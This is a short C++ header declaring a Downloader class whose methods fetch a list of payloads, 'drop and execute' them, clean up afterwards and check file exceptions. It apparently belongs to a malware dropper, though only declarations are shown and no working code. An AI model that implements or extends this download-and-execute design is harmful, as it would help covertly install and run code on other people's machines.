#ifndef DOWNLOADER_H
#define DOWNLOADER_H

#include "HTTPRequest.h"
#include "StringUtils.h"
#include "Constants.h"
#include "Logger.h"

class Downloader
{
public:
	Downloader();
	virtual ~Downloader();
	std::vector<std::string> getPayloadsList();
	void dropExecute(std::vector<std::string> payloadsToDownload);
	void cleanUp(std::vector<std::string> payloadsToDownload);
	bool isInExceptions(std::string file);

protected:
private:
	std::vector<std::string> m_exceptions;
};

#endif // DOWNLOADER_H
